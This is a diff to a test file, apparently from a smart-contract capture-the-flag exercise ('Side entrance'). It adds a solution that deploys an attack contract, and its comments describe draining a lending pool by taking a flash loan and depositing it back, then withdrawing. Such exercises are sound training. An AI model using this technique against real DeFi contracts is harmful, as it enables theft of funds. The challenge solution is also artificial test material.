@@ -26,6 +26,12 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        let sideAttack = await (await ethers.getContractFactory('SideAttack')).deploy(pool.address);
+
+        //we ask for a flash loan and use it to call deposit(), incrementing our balance 
+        //but also returning the loan. this allows us to later call withdraw() and drain the pool
+        await sideAttack.connect(player).attack();
     });
 
     after(async function () {
